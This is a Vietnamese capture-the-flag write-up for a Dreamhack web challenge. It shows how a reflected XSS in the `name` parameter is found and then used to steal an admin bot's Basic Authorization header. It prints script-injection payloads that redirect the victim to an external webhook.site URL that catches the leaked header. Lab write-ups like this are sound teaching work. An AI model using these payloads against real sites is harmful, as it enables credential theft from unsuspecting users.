---
title: Are you admin?
date: 2026-10-12
ctf: Dreamhack
category: web
difficulty: medium
tags:
  - XSS
  - Authorization Header
  - Basic Auth
---

# Đề bài 
Hmm... You look suspicious. Are you admin?
https://dreamhack.io/wargame/challenges/1922
# Solution 
Đọc source code của `app.py`, ta thấy ở route `/intro` yêu cầu 2 param là `name` và `detail`
Ta thử nhập như sau: `http://127.0.0.1:8000/intro?name=hello&detail=hello` thì thu được 
![image](https://hackmd.io/_uploads/BkqLs4rjzg.png)
Quan trọng là trong source code in lên màn hình `input` của người dùng
-> Ta nghĩ ngay tới XSS để chèn đoạn JS vào `html` của trang
Thử `detail=<script>alert(1)</script>` thì nhận thấy `<` và `>` bị encode
Thử `name=<script>alert(1)</script>` thì thấy XSS đã thành công
![image](https://hackmd.io/_uploads/H1Rz3EBoMx.png)

Ta check thử route `/whoami` thì thấy để lấy được flag, ta phải có `id = admin` và `password`
![image](https://hackmd.io/_uploads/rylkaVBsze.png)
Mà để có được `id = admin` thì ta phải có header `Authorization`
![image](https://hackmd.io/_uploads/rkoZaESiGl.png)

Vậy ta nghĩ đến việc chuyển hướng người dùng tới trang mà ta kiểm soát để lấy `Authorization`
Ở đây tôi sử dụng [webhook](https://webhook.site/)

-> Payload: 
```
http://127.0.0.1:8000/intro?name=%3Cscript%3Ewindow.location.href=%22https://webhook.site/7d8586dc-1810-4e8d-bea6-a865704b1ff0%22%3C/script%3E&detail=1
```
sau khi gửi đến `/intro` thì tôi nhận thấy đã được chuyển hướng và webhook bắt được tín hiệu, thế nhưng lại không có `Authorization`
![image](https://hackmd.io/_uploads/rJhsfSBoMx.png)

Đọc lại source thấy có route `/report` cũng lấy param `name` và `detail`. 
![image](https://hackmd.io/_uploads/BJyhZBBjGe.png)
Khi ta điền form thì có method là `POST` với path lấy từ form, lấy về `name` và `detail`

Ta thử điền payload sau xem có nhận được tín hiệu không
```
/report?name=<script>location.href="https://webhook.site/7d8586dc-1810-4e8d-bea6-a865704b1ff0"</script>&detail=1
```
![image](https://hackmd.io/_uploads/B1vrXHBjMe.png)
Lần này thì đã có header `Authorization` rồi
-> `Basic YWRtaW46bG9jYWxwYXNzMTIz`

Vậy ta chỉ cần thêm header và gửi request đến server và nhận lại flag.
![image](https://hackmd.io/_uploads/r1gwNHBoGl.png)
-> `DH{local_test_flag}`


> Nếu ai thắc mắc về password của `admin`:
>  Lần này đọc lại route `/whoami`, thấy `user_info` là header `Authorization` bỏ chữ `Basic` rồi decode Base64
Tôi dùng [CyberChef](https://gchq.github.io/CyberChef/) để decode, thu được 
![image](https://hackmd.io/_uploads/rywe4HSjGg.png)
